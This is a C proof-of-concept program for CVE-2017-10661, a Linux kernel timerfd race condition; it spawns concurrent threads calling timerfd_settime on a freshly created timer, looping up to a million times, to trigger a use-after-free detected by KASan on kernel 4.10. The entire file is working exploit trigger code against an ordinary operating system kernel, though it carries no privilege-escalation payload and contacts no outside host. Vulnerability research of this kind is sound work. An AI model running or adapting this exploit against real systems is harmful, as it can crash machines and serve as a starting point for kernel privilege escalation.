/*
 * PoC for CVE-2017-10661, triggers UAF with KASan enabled in kernel 4.10
 */
#include <string.h>
#include <sys/timerfd.h>
#include <sys/time.h>
#include <sys/msg.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <sys/mman.h>
#include <errno.h>
#include <time.h>
#include <netinet/ip.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <unistd.h>
#include <stdlib.h>
#include <stdio.h>
#include <stdint.h>
#include <pthread.h>
#define RACE_TIME 1000000
int fd;
int fd_dumb;
int count=0;


void* list_add_thread(void* arg){

    int ret;

    struct itimerspec new ={
        .it_interval={
            .tv_sec=100,
            .tv_nsec=100
        },
        .it_value={
            .tv_sec=100,
            .tv_nsec=100
        }
    };

    int i=0;
    while(i<1){

        ret=timerfd_settime(fd,3,&new,NULL);

        if(ret<0){
            perror("timerfd settime failed !");
        }
        i++;
    }


    return NULL;
}

void* list_del_thread(void* arg){

    int ret;

    struct itimerspec new ={
        .it_interval={
            .tv_sec=100,
            .tv_nsec=100
        },
        .it_value={
            .tv_sec=100,
            .tv_nsec=100
        }
    };

    int i=0;
    while(i<1){
        ret=timerfd_settime(fd,1,&new,NULL);

        if(ret<0){
            perror("timerfd settime failed !");
        }
        i++;
    }
    return NULL;

}

int post_race()
{
    int ret;

    struct itimerspec new ={
        .it_interval={
            .tv_sec=100,
            .tv_nsec=100
        },
        .it_value={
            .tv_sec=100,
            .tv_nsec=100
        }
    };

    int i=0;

    struct timeval tv={
        .tv_sec = 120+count*2,
        .tv_usec = 100
    };
    ret=settimeofday(&tv,NULL);
    if(ret<0){
        perror("settimeofday");
    }
    return 0;
}

int do_race(){
    int ret_add[2];
    int i;
    int j;
    pthread_t th[2]={0};

    i=0;
    while(i<RACE_TIME){
        if(i%128)
            printf("%d\n",i);


        fd=timerfd_create(CLOCK_REALTIME,0); // create the victim ctx
        if(fd<0){
            perror("timerfd craete failed!");
            return -1;
        }
        ret_add[0] = pthread_create(&th[0],NULL,list_add_thread,(void*)1);
        ret_add[1] = pthread_create(&th[1],NULL,list_add_thread,(void*)2);

        for( j=0;j<2;j++){
            pthread_join(th[j],NULL);
        }

        close(fd);
        usleep(150000);

        i++;
        count++;
    }
    return 0;
}

int main(int argc, char const *argv[])
{
    int ret;

    // add dumb ctx
    void* area;
    void* base;
    struct itimerspec new ={
        .it_interval={
            .tv_sec=100,
            .tv_nsec=100
        },
        .it_value={
            .tv_sec=100,
            .tv_nsec=100
        }
    };
    fd_dumb = timerfd_create(CLOCK_REALTIME,0);

    ret=timerfd_settime(fd_dumb,3,&new,NULL);
    if(ret<0){
        perror("timerfd settime failed !");
    }

    ret=do_race();
    if(ret <0){
        puts("race failed!");
        goto error_end;
    }

    sleep(5);
error_end:
    close(fd);
    exit(1);
}